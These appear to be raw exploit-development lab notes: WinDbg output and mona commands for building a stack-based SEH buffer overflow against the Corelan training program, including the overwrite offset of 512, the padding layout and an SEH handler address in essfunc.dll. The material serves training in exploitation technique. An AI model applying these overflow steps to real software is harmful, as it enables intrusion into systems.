0:000> g
Breakpoint 0 hit
eax=00000015 ebx=00288000 ecx=a16c5242 edx=00000000 esi=00411023 edi=0019fee4
eip=004118ac esp=0019f9e0 ebp=0019fd7c iopl=0         nv up ei ng nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000286
Corelan_Vulnprogram!GetInput+0xec:
004118ac e8a8f8ffff      call    Corelan_Vulnprogram!ILT+340(__security_check_cookie (00411159)
0:000> dd 0x00411159
00411159  [000cb2e9] 40a2e900 e8e90000 e900001e
00411169  00001f73 0040a5e9 0cb9e900 49e90000
00411179  e9000041 000029af 0025dae9 4188e900
00411189  b9e90000 e9000041 000025fb 0012e6e9
00411199  4180e900 1ce90000 e9000042 00001ed7
004111a9  002e02e9 41dee900 08e90000 e9000040
004111b9  00003c03 00421ee9 1cf9e900 b9e90000
004111c9  e9000041 00004130 00404de9 19c5e900

uf Corelan_Vulnprogram!GetInput

uf Corelan_Vulnprogram!main

0:000> bp 00411a6e 
0:000> bl
     0 e Disable Clear  00411a6e     0001 (0001)  0:**** Corelan_Vulnprogram!main+0x1e

0:000> bp 004118ac 
0:000> bl
     0 e Disable Clear  004118ac     0001 (0001)  0:**** Corelan_Vulnprogram!GetInput+0xec

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9

0:000> !load pykd.pyd
0:000> !py mona pattern_offset 1rA0 600
Hold on...
[+] Command used:
!py mona.py pattern_offset 1rA0 600
Looking for 1rA0 in pattern of 500000 bytes
 - Pattern 0Ar1 (1rA0 reversed) found in cyclic pattern at position 512
Looking for 1rA0 in pattern of 500000 bytes
 - Pattern 0Ar1 not found in cyclic pattern (uppercase) 
Looking for 1rA0 in pattern of 500000 bytes
 - Pattern 0Ar1 not found in cyclic pattern (lowercase) 

[+] This mona.py action took 0:00:00.559000

>>> print("A" * (512-4))
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
BBBB

!load lld

!injectdll C:\Users\Sales2\Desktop\Corelan\Corelan-Vulnprogram\Corelan-Vulnprogram\essfunc.dll

1. Use SEH buffer overflow

after SEH, it is supposed to look like this

0:000> !exchain
0019cca4: ntdll!ExecuteHandler2+44 (77d08a40)
0019f418: essfunc!EssentialFunc6+7 (625011e3)
Invalid exception stack at cccccccc

to verify, set nseh as interrupts

0:000> d eip
0019f419  cc cc cc e3 11 50 62 42-42 42 42 43 43 43 43 44  .....PbBBBBCCCCD
0019f429  44 44 44 45 45 45 45 46-46 46 46 47 47 47 47 48  DDDEEEEFFFFGGGGH
0019f439  48 48 48 49 49 49 49 4a-4a 4a 4a 4b 4b 4b 4b 4c  HHHIIIIJJJJKKKKL
0019f449  4c 4c 4c 4d 4d 4d 4d 4e-4e 4e 4e 4f 4f 4f 4f 50  LLLMMMMNNNNOOOOP
0019f459  50 50 50 42 42 42 42 43-43 43 43 44 44 44 44 45  PPPBBBBCCCCDDDDE
0019f469  45 45 45 46 46 46 46 47-47 47 47 48 48 48 48 49  EEEFFFFGGGGHHHHI
0019f479  49 49 49 4a 4a 4a 4a 4b-4b 4b 4b 4c 4c 4c 4c 4d  IIIJJJJKKKKLLLLM
0019f489  4d 4d 4d 4e 4e 4e 4e 4f-4f 4f 4f 50 50 50 50 42  MMMNNNNOOOOPPPPB



